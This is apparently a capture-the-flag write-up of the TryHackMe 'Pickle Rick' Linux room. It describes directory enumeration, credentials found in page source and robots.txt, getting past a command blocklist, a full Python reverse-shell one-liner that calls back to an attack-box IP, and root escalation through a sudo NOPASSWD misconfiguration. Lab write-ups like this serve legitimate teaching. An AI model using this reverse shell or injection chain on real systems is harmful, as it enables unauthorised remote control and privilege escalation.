
# TryHackMe: Pickle Rick
**Platform:** TryHackMe | **OS:** Linux | **Difficulty:** Easy | **Date:** October 2026

## 1. Executive Summary
*Pickle Rick* is a Linux-based web exploitation challenge that highlights the dangers of exposing unfiltered system command execution panels on web interfaces. The attack chain utilized manual source code review to harvest credentials, bypassed command filters to read sensitive files, and leveraged a Python pseudo-terminal reverse shell to establish persistent access. Privilege escalation was achieved via a catastrophic `sudo` misconfiguration.

## 2. Reconnaissance & Initial Access
**Step 1: Perimeter Mapping**
`nmap` and `gobuster` were deployed to map open ports and hidden web directories, utilizing the `-x` flag to explicitly hunt for PHP and text files.
```bash
gobuster dir -u http://<Target_IP> -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```
**Step 2: Credential Harvesting**
Manual web enumeration yielded critical authentication data:

**Username:** Discovered hidden within HTML comments via Page Source inspection.

**Password:** Discovered exposed in plaintext within the /robots.txt file.

Using these credentials, successful authentication was achieved against a hidden portal.php web panel.

## 3. Exploitation (Command Injection & Reverse Shell)
The web portal contained a command execution panel. Basic enumeration (`whoami, ls -la`) confirmed arbitrary command execution as the www-data user.

**Step 1: Filter Evasion**
The web application implemented a naive blocklist preventing the use of the `cat` command. This was successfully bypassed using alternative file-reading binaries to secure the first ingredient flag.

```bash
less Sup3rS3cretPickl3Ingred.txt
```
**Step 2: Reverse Shell Execution**
To bypass the clunky web interface, a Netcat listener was established on the attack machine (`nc -lvnp 4444`). A Python3 reverse shell payload was injected into the web panel, successfully calling back to the TryHackMe AttackBox IP.

Python
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ATTACKBOX_IP>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```
## 4. Post-Exploitation & Privilege Escalation
**Step 1: Shell Stabilization**
The raw reverse shell connection was upgraded to a fully interactive TTY using Python.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Note: The second ingredient flag was successfully located and read within `/home/rick`.

**Step 2: Sudo Misconfiguration (Root Escalation)**
A review of the `www-data` user privileges revealed a critical vulnerability: the web user was permitted to execute any command as `root` without providing a password.

```bash
sudo -l
```
`Output: (ALL) NOPASSWD: ALL`
Immediate escalation to the root user was executed, allowing access to /root and the final ingredient flag.

```bash
sudo bash
cd /root
cat 3rd ingredient
